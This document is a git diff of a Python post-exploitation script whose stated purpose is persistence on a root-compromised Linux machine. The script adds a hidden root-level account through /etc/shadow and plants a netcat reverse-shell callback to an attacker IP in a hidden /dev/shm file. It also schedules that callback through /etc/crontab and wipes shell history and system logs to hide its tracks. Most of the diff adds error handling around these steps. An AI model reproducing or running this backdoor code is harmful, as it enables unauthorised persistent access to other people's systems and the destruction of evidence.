@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 # author: suffs811
-# github: 
+# github: https://github.com/cysec11/scripts.git
 # purpose: script for establishing persistence on root-compromised linux machine (adding new root user and backdoor beacon on target box)
 # 
 # usage: python3 pers.py -u 'pepe' -p 'password' 10.0.0.1 4444
@@ -50,7 +50,7 @@ def perm_check(perms, is_root):
 	else:
 		is_root = "False"
 		return False
-		print("Error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check")
+		print("\n*** error: you do not have root permissions on local box; if this is a mistake, use -f to bypass root check ***")
 	return is_root
 
 
@@ -66,27 +66,36 @@ def add_user(username):
 		f = open("/tmp/.backups/passwd.txt", "r")
 		new_user_pass = f.read()
 		os.system(f"echo '{username}:{new_user_pass}:0:0:root:/{username}:/bin/bash' >> /etc/shadow")
-		print(f"user {username} added") 
+		print(f"user {username} added")
+		f.close()
+	else:
+		print("\n*** error: username not specified: use -u to specify username ***")
+		return
 
 
 # create script for nc rev shell callback
 def callback(local_ip, local_port, username):
-	print(f"\n### creating callback script for {local_ip}:{local_port} ###")
-	os.system("mkdir /dev/shm/.data")
-	os.system("touch /dev/shm/.data/data-log.sh")
-	os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {local_ip} {local_port} >/tmp/f' > /dev/shm/.data/data-log.sh")
-	os.system("chmod 100 /dev/shm/.data/data-log.sh")
-	os.system(f"chown {username}: /dev/shm/.data/")
-	os.system("chmod 700 /dev/shm/.data/")
-
-	#os.system(f"echo 'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1' > /dev/shm/.data/data-log.sh")
-
+	try:
+		print(f"\n### creating callback script for {local_ip}:{local_port} ###")
+		os.system("mkdir /dev/shm/.data")
+		os.system("touch /dev/shm/.data/data-log.sh")
+		os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {local_ip} {local_port} >/tmp/f' > /dev/shm/.data/data-log.sh")
+		os.system("chmod 100 /dev/shm/.data/data-log.sh")
+		os.system(f"chown {username}: /dev/shm/.data/")
+		os.system("chmod 700 /dev/shm/.data/")
+		print("\n### callback placed at /dev/shm/.data/data-log.sh ###")
+		#os.system(f"echo 'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1' > /dev/shm/.data/data-log.sh")
+	except:
+		print("\n*** error: couldn't create callback script. netcat might not exist on machine, uncomment two lines above for bash rev shell ***")
 
 # create cronjob for executing callback script every 5 min
 def cron_make():
-	print("\n### creating cronjob to execute callback every 5 min... ###")
-	os.system("echo '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' >> /etc/crontab")
-
+	try:
+		print("\n### creating cronjob to execute callback every 5 min... ###")
+		os.system("echo '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' >> /etc/crontab")
+		print("\n### cronjob created ###")
+	except:
+		print("\n*** error: couldn't create cronjob, try manually making one with '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' ***")
 
 # cover tracks and reestablish history logging
 def clear_tracks():
@@ -100,7 +109,7 @@ def clear_tracks():
         os.system("echo ' ' > ~/.bash_history")
         os.system("echo ' ' > /root/.bash_history")
 
-	# placing old contents back into logs
+		# placing old contents back into logs
         os.system("echo /tmp/.backups/auth.log > /var/log/auth.log")
         os.system("echo /tmp/.backups/cron.log > /var/log/cron.log")
         os.system("echo /tmp/.backups/maillog > /var/log/maillog")
